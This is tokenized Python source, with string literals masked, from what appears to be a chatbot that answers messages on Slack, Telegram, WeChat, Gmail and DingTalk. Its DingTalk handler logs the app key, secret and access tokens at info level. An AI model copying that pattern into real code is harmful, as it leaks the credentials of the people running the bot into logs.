) <EOL> id = data [ "<STR_LIT>" ] <EOL> context [ '<STR_LIT>' ] = str ( id ) <EOL> context [ '<STR_LIT>' ] = True <EOL> context [ '<STR_LIT>' ] = data [ "<STR_LIT>" ] <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_HANDLE_CONTEXT , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : data [ "<STR_LIT>" ] , '<STR_LIT>' : data [ "<STR_LIT>" ] , "<STR_LIT>" : context } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if not e_context . is_pass ( ) : <EOL> async for final , reply in super ( ) . build_reply_stream ( data [ "<STR_LIT>" ] , context ) : <EOL> yield final , reply <EOL> else : <EOL> yield True , reply <EOL> </s>
<s> import re <EOL> from slack_bolt import App <EOL> from slack_bolt . adapter . socket_mode import SocketModeHandler <EOL> from common import const <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from config import channel_conf <EOL> app = App ( token = channel_conf ( const . SLACK ) . get ( '<STR_LIT>' ) ) <EOL> handler = SocketModeHandler ( app = app , <EOL> app_token = channel_conf ( const . SLACK ) . get ( '<STR_LIT>' ) ) <EOL> @ app . event ( "<STR_LIT>" ) <EOL> def handle_mention ( event , say ) : <EOL> if '<STR_LIT>' in event : <EOL> ts = event [ "<STR_LIT>" ] <EOL> else : <EOL> ts = event [ "<STR_LIT>" ] <EOL> reply_text = SlackChannel ( ) . handle ( event ) <EOL> say ( text = f"<STR_LIT>" , thread_ts = ts ) <EOL> class SlackChannel ( Channel ) : <EOL> def startup ( self ) : <EOL> handler . start ( ) <EOL> def handle ( self , event ) : <EOL> context = dict ( ) <EOL> if '<STR_LIT>' in event : <EOL> ts = event [ "<STR_LIT>" ] <EOL> else : <EOL> ts = event [ "<STR_LIT>" ] <EOL> context [ '<STR_LIT>' ] = str ( ts ) <EOL> plain_text = re . sub ( r"<STR_LIT>" , "<STR_LIT>" , event [ "<STR_LIT>" ] ) <EOL> return super ( ) . build_reply_content ( plain_text , context ) <EOL> </s>
<s> from concurrent . futures import ThreadPoolExecutor <EOL> import io <EOL> import requests <EOL> import telebot <EOL> from common import const <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from config import channel_conf_val , channel_conf <EOL> bot = telebot . TeleBot ( token = channel_conf ( const . TELEGRAM ) . get ( '<STR_LIT>' ) ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ bot . message_handler ( commands = [ '<STR_LIT>' ] ) <EOL> def send_welcome ( message ) : <EOL> bot . send_message ( message . chat . id , "<STR_LIT>" , parse_mode = "<STR_LIT>" ) <EOL> @ bot . message_handler ( content_types = [ '<STR_LIT>' ] ) <EOL> def send_welcome ( msg ) : <EOL> TelegramChannel ( ) . handle ( msg ) <EOL> class TelegramChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def startup ( self ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> bot . infinity_polling ( ) <EOL> def handle ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + msg . text ) <EOL> img_match_prefix = self . check_prefix ( msg , channel_conf_val ( const . TELEGRAM , '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> thread_pool . submit ( self . _do_send_img , msg , str ( msg . chat . id ) ) <EOL> else : <EOL> thread_pool . submit ( self . _dosend , msg . text , msg ) <EOL> def _dosend ( self , query , msg ) : <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = str ( msg . chat . id ) <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_text ) ) <EOL> bot . reply_to ( msg , reply_text ) <EOL> def _do_send_img ( self , msg , reply_user_id ) : <EOL> try : <EOL> if not msg : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> img_urls = super ( ) . build_reply_content ( msg . text , context ) <EOL> if not img_urls : <EOL> return <EOL> if not isinstance ( img_urls , list ) : <EOL> bot . reply_to ( msg , img_urls ) <EOL> return <EOL> for url in img_urls : <EOL> pic_res = requests . get ( url , stream = True ) <EOL> image_storage = io . BytesIO ( ) <EOL> for block in pic_res . iter_content ( <NUM_LIT> ) : <EOL> image_storage . write ( block ) <EOL> image_storage . seek ( <NUM_LIT> ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_user_id ) ) <EOL> bot . send_photo ( msg . chat . id , image_storage ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def check_prefix ( self , msg , prefix_list ) : <EOL> if not prefix_list : <EOL> return None <EOL> for prefix in prefix_list : <EOL> if msg . text . startswith ( prefix ) : <EOL> return prefix <EOL> return None <EOL> </s>
<s> import time <EOL> import itchat <EOL> import json <EOL> from itchat . content import * <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> from common . log import logger <EOL> from common import const <EOL> from config import channel_conf_val <EOL> import requests <EOL> from plugins . plugin_manager import * <EOL> from common . sensitive_word import SensitiveWord <EOL> import io <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> sw = SensitiveWord ( ) <EOL> @ itchat . msg_register ( TEXT ) <EOL> def handler_single_msg ( msg ) : <EOL> WechatChannel ( ) . handle ( msg ) <EOL> return None <EOL> @ itchat . msg_register ( TEXT , isGroupChat = True ) <EOL> def handler_group_msg ( msg ) : <EOL> WechatChannel ( ) . handle_group ( msg ) <EOL> return None <EOL> class WechatChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> pass <EOL> def startup ( self ) : <EOL> hot_reload = channel_conf_val ( const . WECHAT , '<STR_LIT>' , True ) <EOL> if channel_conf_val ( const . WECHAT , '<STR_LIT>' ) : <EOL> itchat . auto_login ( enableCmdQR = <NUM_LIT> , hot_reload = hot_reload , qrCallback = self . login ) <EOL> else : <EOL> itchat . auto_login ( enableCmdQR = <NUM_LIT> , hotReload = hot_reload ) <EOL> itchat . run ( ) <EOL> def login ( self , uuid = None , status = '<STR_LIT>' , qrcode = None ) : <EOL> print ( '<STR_LIT>' , uuid ) <EOL> print ( '<STR_LIT>' , status ) <EOL> print ( '<STR_LIT>' , '<STR_LIT>' + uuid ) <EOL> def handle ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + json . dumps ( msg , ensure_ascii = False ) ) <EOL> from_user_id = msg [ '<STR_LIT>' ] <EOL> to_user_id = msg [ '<STR_LIT>' ] <EOL> other_user_id = msg [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> create_time = msg [ '<STR_LIT>' ] <EOL> content = msg [ '<STR_LIT>' ] <EOL> hot_reload = channel_conf_val ( const . WECHAT , '<STR_LIT>' , True ) <EOL> if hot_reload == True and int ( create_time ) < int ( time . time ( ) ) - <NUM_LIT> : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return <EOL> if sw . process_text ( content ) : <EOL> self . send ( '<STR_LIT>' , from_user_id ) <EOL> return <EOL> match_prefix = self . check_prefix ( content , channel_conf_val ( const . WECHAT , '<STR_LIT>' ) ) <EOL> if from_user_id == other_user_id and match_prefix is not None : <EOL> if match_prefix != '<STR_LIT>' : <EOL> str_list = content . split ( match_prefix , <NUM_LIT> ) <EOL> if len ( str_list ) == <NUM_LIT> : <EOL> content = str_list [ <NUM_LIT> ] . strip ( ) <EOL> thread_pool . submit ( self . _do_send , content , from_user_id ) <EOL> elif to_user_id == other_user_id and match_prefix : <EOL> str_list = content . split ( match_prefix , <NUM_LIT> ) <EOL> if len ( str_list ) == <NUM_LIT> : <EOL> content = str_list [ <NUM_LIT> ] . strip ( ) <EOL> thread_pool . submit ( self . _do_send , content , to_user_id ) <EOL> def handle_group ( self , msg ) : <EOL> logger . debug ( "<STR_LIT>" + json . dumps ( msg , ensure_ascii = False ) ) <EOL> group_name = msg [ '<STR_LIT>' ] . get ( '<STR_LIT>' , None ) <EOL> group_id = msg [ '<STR_LIT>' ] . get ( '<STR_LIT>' , None ) <EOL> create_time = msg [ '<STR_LIT>' ] <EOL> hot_reload = channel_conf_val ( const . WECHAT , '<STR_LIT>' , True ) <EOL> if hot_reload == True and int ( create_time ) < int ( time . time ( ) ) - <NUM_LIT> : <EOL> logger . debug ( "<STR_LIT>" ) <EOL> return <EOL> if not group_name : <EOL> return None <EOL> origin_content = msg [ '<STR_LIT>' ] <EOL> content = msg [ '<STR_LIT>' ] <EOL> content_list = content . split ( '<STR_LIT>' , <NUM_LIT> ) <EOL> context_special_list = content . split ( '<STR_LIT>' , <NUM_LIT> ) <EOL> if len ( context_special_list ) == <NUM_LIT> : <EOL> content = context_special_list [ <NUM_LIT> ] <EOL> elif len ( content_list ) == <NUM_LIT> : <EOL> content = content_list [ <NUM_LIT> ] <EOL> match_prefix = ( msg [ '<STR_LIT>' ] and not channel_conf_val ( const . WECHAT , "<STR_LIT>" , False ) ) or self . check_prefix ( origin_content , channel_conf_val ( const . WECHAT , '<STR_LIT>' ) ) or self . check_contain ( origin_content , channel_conf_val ( const . WECHAT , '<STR_LIT>' ) ) <EOL> if match_prefix is True : <EOL> if sw . process_text ( content ) : <EOL> self . send ( '<STR_LIT>' , group_id ) <EOL> return <EOL> group_white_list = channel_conf_val ( const . WECHAT , '<STR_LIT>' ) <EOL> if ( '<STR_LIT>' in group_white_list or group_name in group_white_list or self . check_contain ( group_name , channel_conf_val ( const . WECHAT , '<STR_LIT>' ) ) ) and match_prefix : <EOL> thread_pool . submit ( self . _do_send_group , content , msg ) <EOL> return None <EOL> def send ( self , msg , receiver ) : <EOL> logger . info ( '<STR_LIT>' . format ( msg , receiver ) ) <EOL> itchat . send ( msg , toUserName = receiver ) <EOL> def _do_send ( self , query , reply_user_id ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = reply_user_id <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_HANDLE_CONTEXT , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : query , "<STR_LIT>" : context } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if not e_context . is_pass ( ) : <EOL> reply = super ( ) . build_reply_content ( e_context [ "<STR_LIT>" ] , e_context [ "<STR_LIT>" ] ) <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_DECORATE_REPLY , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : context , '<STR_LIT>' : reply , "<STR_LIT>" : e_context [ "<STR_LIT>" ] } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if reply : <EOL> self . send ( channel_conf_val ( const . WECHAT , "<STR_LIT>" ) + reply , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def _do_send_img ( self , query , context ) : <EOL> try : <EOL> if not query : <EOL> return <EOL> reply_user_id = context [ '<STR_LIT>' ] <EOL> img_urls = super ( ) . build_reply_content ( query , context ) <EOL> if not img_urls : <EOL> return <EOL> if not isinstance ( img_urls , list ) : <EOL> self . send ( channel_conf_val ( const . WECHAT , "<STR_LIT>" ) + img_urls , reply_user_id ) <EOL> return <EOL> for url in img_urls : <EOL> pic_res = requests . get ( url , stream = True ) <EOL> image_storage = io . BytesIO ( ) <EOL> for block in pic_res . iter_content ( <NUM_LIT> ) : <EOL> image_storage . write ( block ) <EOL> image_storage . seek ( <NUM_LIT> ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_user_id ) ) <EOL> itchat . send_image ( image_storage , reply_user_id ) <EOL> except Exception as e : <EOL> logger . exception ( e ) <EOL> def _do_send_group ( self , query , msg ) : <EOL> if not query : <EOL> return <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = msg [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_HANDLE_CONTEXT , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : query , "<STR_LIT>" : context } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if not e_context . is_pass ( ) : <EOL> context [ '<STR_LIT>' ] = msg [ '<STR_LIT>' ] <EOL> reply = super ( ) . build_reply_content ( e_context [ "<STR_LIT>" ] , e_context [ "<STR_LIT>" ] ) <EOL> e_context = PluginManager ( ) . emit_event ( EventContext ( Event . ON_DECORATE_REPLY , { <EOL> '<STR_LIT>' : self , '<STR_LIT>' : context , '<STR_LIT>' : reply , "<STR_LIT>" : e_context [ "<STR_LIT>" ] } ) ) <EOL> reply = e_context [ '<STR_LIT>' ] <EOL> if reply : <EOL> reply = '<STR_LIT>' + msg [ '<STR_LIT>' ] + '<STR_LIT>' + reply . strip ( ) <EOL> self . send ( channel_conf_val ( const . WECHAT , "<STR_LIT>" , "<STR_LIT>" ) + reply , msg [ '<STR_LIT>' ] [ '<STR_LIT>' ] ) <EOL> def check_prefix ( self , content , prefix_list ) : <EOL> for prefix in prefix_list : <EOL> if content . startswith ( prefix ) : <EOL> return prefix <EOL> return None <EOL> def check_contain ( self , content , keyword_list ) : <EOL> if not keyword_list : <EOL> return None <EOL> for ky in keyword_list : <EOL> if content . find ( ky ) != - <NUM_LIT> : <EOL> return True <EOL> return None <EOL> </s>
<s> from bridge . bridge import Bridge <EOL> class Channel ( object ) : <EOL> def startup ( self ) : <EOL> raise NotImplementedError <EOL> def handle ( self , msg ) : <EOL> raise NotImplementedError <EOL> def send ( self , msg , receiver ) : <EOL> raise NotImplementedError <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> async def build_reply_stream ( self , query , context = None ) : <EOL> async for final , response in Bridge ( ) . fetch_reply_stream ( query , context ) : <EOL> yield final , response <EOL> </s>
<s> import smtplib <EOL> import imaplib <EOL> import email <EOL> import re <EOL> import base64 <EOL> import time <EOL> from random import randrange <EOL> from email . mime . text import MIMEText <EOL> from email . header import decode_header <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> from common import const <EOL> from config import channel_conf_val , channel_conf <EOL> smtp_ssl_host = '<STR_LIT>' <EOL> imap_ssl_host = '<STR_LIT>' <EOL> MAX_DELAY = <NUM_LIT> <EOL> MIN_DELAY = <NUM_LIT> <EOL> STEP_TIME = <NUM_LIT> <EOL> LATESTN = <NUM_LIT> <EOL> wait_time = <NUM_LIT> <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> def checkEmail ( email ) : <EOL> regex = r'<STR_LIT>' <EOL> if re . search ( regex , email ) : <EOL> return True <EOL> else : <EOL> return False <EOL> def process ( max , speed ) : <EOL> global wait_time <EOL> i = <NUM_LIT> <EOL> while i <= max : <EOL> i = i + <NUM_LIT> <EOL> time . sleep ( speed ) <EOL> print ( "<STR_LIT>" + "<STR_LIT>" + str ( i + wait_time ) + "<STR_LIT>" , end = '<STR_LIT>' ) <EOL> wait_time += max * speed <EOL> class GmailChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> self . host_email = channel_conf_val ( const . GMAIL , '<STR_LIT>' ) <EOL> self . host_password = channel_conf_val ( const . GMAIL , '<STR_LIT>' ) <EOL> self . subject_keyword = channel_conf_val ( const . GMAIL , '<STR_LIT>' ) <EOL> def startup ( self ) : <EOL> global wait_time <EOL> ques_list = list ( ) <EOL> lastques = { '<STR_LIT>' : None , '<STR_LIT>' : None , '<STR_LIT>' : None } <EOL> print ( "<STR_LIT>" ) <EOL> while ( True ) : <EOL> ques_list = self . receiveEmail ( ) <EOL> if ques_list : <EOL> for ques in ques_list : <EOL> if ques [ '<STR_LIT>' ] is None : <EOL> print ( "<STR_LIT>" % ques [ '<STR_LIT>' ] ) <EOL> elif ( lastques [ '<STR_LIT>' ] == ques [ '<STR_LIT>' ] and lastques [ '<STR_LIT>' ] == ques [ '<STR_LIT>' ] ) : <EOL> print ( "<STR_LIT>" % ( ques [ '<STR_LIT>' ] ) ) <EOL> else : <EOL> if ques [ '<STR_LIT>' ] : <EOL> print ( "<STR_LIT>" , end = '<STR_LIT>' ) <EOL> self . handle ( ques ) <EOL> lastques = ques <EOL> wait_time = <NUM_LIT> <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> process ( randrange ( MIN_DELAY , MAX_DELAY ) , STEP_TIME ) <EOL> def handle ( self , question ) : <EOL> message = dict ( ) <EOL> context = dict ( ) <EOL> print ( "<STR_LIT>" % ( question [ '<STR_LIT>' ] , question [ '<STR_LIT>' ] ) ) <EOL> context [ '<STR_LIT>' ] = question [ '<STR_LIT>' ] <EOL> answer = super ( ) . build_reply_content ( question [ '<STR_LIT>' ] , context ) <EOL> message = MIMEText ( answer ) <EOL> message [ '<STR_LIT>' ] = question [ '<STR_LIT>' ] <EOL> message [ '<STR_LIT>' ] = self . host_email <EOL> message [ '<STR_LIT>' ] = question [ '<STR_LIT>' ] <EOL> thread_pool . submit ( self . sendEmail , message ) <EOL> def sendEmail ( self , message : list ) -> dict : <EOL> smtp_server = smtplib . SMTP ( smtp_ssl_host ) <EOL> smtp_server . starttls ( ) <EOL> smtp_server . login ( self . host_email , self . host_password ) <EOL> output = { '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> , '<STR_LIT>' : <NUM_LIT> } <EOL> try : <EOL> smtp_server . sendmail ( message [ '<STR_LIT>' ] , message [ '<STR_LIT>' ] , message . as_string ( ) ) <EOL> print ( "<STR_LIT>" . format ( message [ '<STR_LIT>' ] ) ) <EOL> output [ '<STR_LIT>' ] += <NUM_LIT> <EOL> except Exception as e : <EOL> print ( "<STR_LIT>" . format ( e ) ) <EOL> output [ '<STR_LIT>' ] += <NUM_LIT> <EOL> print ( "<STR_LIT>" . format ( output [ '<STR_LIT>' ] , output [ '<STR_LIT>' ] ) ) <EOL> smtp_server . quit ( ) <EOL> return output <EOL> def receiveEmail ( self ) : <EOL> question_list = list ( ) <EOL> question = { '<STR_LIT>' : None , '<STR_LIT>' : None , '<STR_LIT>' : None } <EOL> imap_server = imaplib . IMAP4_SSL ( imap_ssl_host ) <EOL> imap_server . login ( self . host_email , self . host_password ) <EOL> imap_server . select ( '<STR_LIT>' ) <EOL> status , data = imap_server . search ( None , '<STR_LIT>' ) <EOL> mail_ids = [ ] <EOL> for block in data : <EOL> mail_ids += block . split ( ) <EOL> mail_ids = mail_ids [ - LATESTN : ] <EOL> for i in mail_ids : <EOL> status , data = imap_server . fetch ( i , '<STR_LIT>' ) <EOL> for response in data : <EOL> if isinstance ( response , tuple ) : <EOL> message = email . message_from_bytes ( response [ <NUM_LIT> ] ) <EOL> mail_from = message [ '<STR_LIT>' ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] . replace ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> mail_subject = decode_header ( message [ '<STR_LIT>' ] ) [ <NUM_LIT> ] [ <NUM_LIT> ] <EOL> if isinstance ( mail_subject , bytes ) : <EOL> try : <EOL> mail_subject = mail_subject . decode ( ) <EOL> except UnicodeDecodeError : <EOL> mail_subject = mail_subject . decode ( '<STR_LIT>' ) <EOL> if not self . check_contain ( mail_subject , self . subject_keyword ) : <EOL> continue <EOL> if message . is_multipart ( ) : <EOL> mail_content = '<STR_LIT>' <EOL> for part in message . get_payload ( ) : <EOL> flag = False <EOL> if isinstance ( part . get_payload ( ) , list ) : <EOL> part = part . get_payload ( ) [ <NUM_LIT> ] <EOL> flag = True <EOL> if part . get_content_type ( ) in [ '<STR_LIT>' , '<STR_LIT>' ] : <EOL> if flag : <EOL> mail_content += str ( part . get_payload ( ) ) <EOL> else : <EOL> try : <EOL> mail_content += base64 . b64decode ( str ( part . get_payload ( ) ) ) . decode ( "<STR_LIT>" ) <EOL> except UnicodeDecodeError : <EOL> mail_content += base64 . b64decode ( str ( part . get_payload ( ) ) ) . decode ( '<STR_LIT>' ) <EOL> else : <EOL> mail_content = message . get_payload ( ) <EOL> question [ '<STR_LIT>' ] = mail_from <EOL> question [ '<STR_LIT>' ] = '<STR_LIT>' . join ( mail_subject . split ( '<STR_LIT>' ) [ <NUM_LIT> : ] ) <EOL> question [ '<STR_LIT>' ] = mail_content <EOL> print ( f'<STR_LIT>' ) <EOL> question_list . append ( question ) <EOL> question = { '<STR_LIT>' : None , '<STR_LIT>' : None , '<STR_LIT>' : None } <EOL> imap_server . store ( i , "<STR_LIT>" , "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" % mail_subject ) <EOL> imap_server . expunge ( ) <EOL> imap_server . close ( ) <EOL> imap_server . logout ( ) <EOL> return question_list <EOL> def check_contain ( self , content , keyword_list ) : <EOL> if not keyword_list : <EOL> return None <EOL> for ky in keyword_list : <EOL> if content . find ( ky ) != - <NUM_LIT> : <EOL> return True <EOL> return None <EOL> </s>
<s> import json <EOL> import hmac <EOL> import hashlib <EOL> import base64 <EOL> import time <EOL> import requests <EOL> from urllib . parse import quote_plus <EOL> from common import log <EOL> from flask import Flask , request , render_template , make_response <EOL> from common import const <EOL> from common import functions <EOL> from config import channel_conf <EOL> from config import channel_conf_val <EOL> from channel . channel import Channel <EOL> class DingTalkHandler ( ) : <EOL> def __init__ ( self , config ) : <EOL> self . dingtalk_key = config . get ( '<STR_LIT>' ) <EOL> self . dingtalk_secret = config . get ( '<STR_LIT>' ) <EOL> self . dingtalk_token = config . get ( '<STR_LIT>' ) <EOL> self . dingtalk_post_token = config . get ( '<STR_LIT>' ) <EOL> self . access_token = None <EOL> log . info ( "<STR_LIT>" . format ( self . dingtalk_key , self . dingtalk_secret , self . dingtalk_token , self . dingtalk_post_token ) ) <EOL> def notify_dingtalk_webhook ( self , data ) : <EOL> timestamp = round ( time . time ( ) * <NUM_LIT> ) <EOL> secret_enc = bytes ( self . dingtalk_secret , encoding = '<STR_LIT>' ) <EOL> string_to_sign = '<STR_LIT>' . format ( timestamp , self . dingtalk_secret ) <EOL> string_to_sign_enc = bytes ( string_to_sign , encoding = '<STR_LIT>' ) <EOL> hmac_code = hmac . new ( secret_enc , string_to_sign_enc , <EOL> digestmod = hashlib . sha256 ) . digest ( ) <EOL> sign = quote_plus ( base64 . b64encode ( hmac_code ) ) <EOL> notify_url = f"<STR_LIT>" <EOL> try : <EOL> log . info ( "<STR_LIT>" . format ( str ( notify_url ) ) ) <EOL> r = requests . post ( notify_url , json = data ) <EOL> reply = r . json ( ) <EOL> log . info ( "<STR_LIT>" . format ( str ( reply ) ) ) <EOL> except Exception as e : <EOL> log . error ( e ) <EOL> def get_token_internal ( self ) : <EOL> access_token_url = '<STR_LIT>' <EOL> try : <EOL> r = requests . post ( access_token_url , json = { "<STR_LIT>" : self . dingtalk_key , "<STR_LIT>" : self . dingtalk_secret } ) <EOL> except : <EOL> raise Exception ( "<STR_LIT>" ) <EOL> data = json . loads ( r . content ) <EOL> access_token = data [ '<STR_LIT>' ] <EOL> expire_in = data [ '<STR_LIT>' ] <EOL> self . access_token = access_token <EOL> self . expire_at = int ( expire_in ) + time . time ( ) <EOL> return self . access_token <EOL> def get_token ( self ) : <EOL> if self . access_token is None or self . expire_at <= time . time ( ) : <EOL> self . get_token_internal ( ) <EOL> return self . access_token <EOL> def get_post_url ( self , data ) : <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> return f"<STR_LIT>" <EOL> else : <EOL> return f"<STR_LIT>" <EOL> def build_response ( self , reply , data ) : <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> return self . build_oto_response ( reply , data ) <EOL> else : <EOL> return self . build_group_response ( reply , data ) <EOL> def build_oto_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> img_match_prefix = functions . check_prefix ( <EOL> prompt , channel_conf_val ( const . DINGTALK , '<STR_LIT>' ) ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robotCode = data [ '<STR_LIT>' ] <EOL> if img_match_prefix and isinstance ( reply , list ) : <EOL> images = "<STR_LIT>" <EOL> for url in reply : <EOL> images += f"<STR_LIT>" <EOL> reply = images <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : "<STR_LIT>" + nick + "<STR_LIT>" , <EOL> "<STR_LIT>" : images + "<STR_LIT>" + "<STR_LIT>" + nick <EOL> } ) , <EOL> "<STR_LIT>" : robotCode , <EOL> "<STR_LIT>" : [ staffid ] <EOL> } <EOL> else : <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : reply <EOL> } ) , <EOL> "<STR_LIT>" : robotCode , <EOL> "<STR_LIT>" : [ staffid ] <EOL> } <EOL> return resp <EOL> def build_group_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> img_match_prefix = functions . check_prefix ( <EOL> prompt , channel_conf_val ( const . DINGTALK , '<STR_LIT>' ) ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robot_code = data [ '<STR_LIT>' ] <EOL> if img_match_prefix and isinstance ( reply , list ) : <EOL> images = "<STR_LIT>" <EOL> for url in reply : <EOL> images += f"<STR_LIT>" <EOL> reply = images <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : "<STR_LIT>" + nick + "<STR_LIT>" , <EOL> "<STR_LIT>" : images + "<STR_LIT>" + "<STR_LIT>" + nick <EOL> } ) , <EOL> "<STR_LIT>" : robot_code , <EOL> "<STR_LIT>" : conversation_id , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> else : <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : json . dumps ( { <EOL> "<STR_LIT>" : reply + "<STR_LIT>" + "<STR_LIT>" + nick <EOL> } ) , <EOL> "<STR_LIT>" : robot_code , <EOL> "<STR_LIT>" : conversation_id , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> return resp <EOL> def build_webhook_response ( self , reply , data ) : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> img_match_prefix = functions . check_prefix ( <EOL> prompt , channel_conf_val ( const . DINGTALK , '<STR_LIT>' ) ) <EOL> nick = data [ '<STR_LIT>' ] <EOL> staffid = data [ '<STR_LIT>' ] <EOL> robotCode = data [ '<STR_LIT>' ] <EOL> if img_match_prefix and isinstance ( reply , list ) : <EOL> images = "<STR_LIT>" <EOL> for url in reply : <EOL> images += f"<STR_LIT>" <EOL> reply = images <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" + nick + "<STR_LIT>" , <EOL> "<STR_LIT>" : images + "<STR_LIT>" + "<STR_LIT>" + nick <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> else : <EOL> resp = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : reply <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ <EOL> staffid <EOL> ] , <EOL> "<STR_LIT>" : False <EOL> } <EOL> } <EOL> return resp <EOL> def chat ( self , channel , data ) : <EOL> reply = channel . handle ( data ) <EOL> type = data [ '<STR_LIT>' ] <EOL> if type == "<STR_LIT>" : <EOL> reply_json = self . build_response ( reply , data ) <EOL> self . notify_dingtalk ( data , reply_json ) <EOL> else : <EOL> reply_json = self . build_webhook_response ( reply , data ) <EOL> self . notify_dingtalk_webhook ( reply_json ) <EOL> def notify_dingtalk ( self , data , reply_json ) : <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : self . get_token ( ) <EOL> } <EOL> notify_url = self . get_post_url ( data ) <EOL> try : <EOL> r = requests . post ( notify_url , json = reply_json , headers = headers ) <EOL> resp = r . json ( ) <EOL> log . info ( "<STR_LIT>" . format ( str ( resp ) ) ) <EOL> except Exception as e : <EOL> log . error ( e ) <EOL> class DingTalkChannel ( Channel ) : <EOL> def __init__ ( self ) : <EOL> log . info ( "<STR_LIT>" ) <EOL> def startup ( self ) : <EOL> http_app . run ( host = '<STR_LIT>' , port = channel_conf ( const . DINGTALK ) . get ( '<STR_LIT>' ) ) <EOL> def handle ( self , data ) : <EOL> reply = "<STR_LIT>" <EOL> prompt = data [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> prompt = prompt . strip ( ) <EOL> if str ( prompt ) != <NUM_LIT> : <EOL> conversation_id = data [ '<STR_LIT>' ] <EOL> sender_id = data [ '<STR_LIT>' ] <EOL> context = dict ( ) <EOL> img_match_prefix = functions . check_prefix ( <EOL> prompt , channel_conf_val ( const . DINGTALK , '<STR_LIT>' ) ) <EOL> if img_match_prefix : <EOL> prompt = prompt . split ( img_match_prefix , <NUM_LIT> ) [ <NUM_LIT> ] . strip ( ) <EOL> context [ 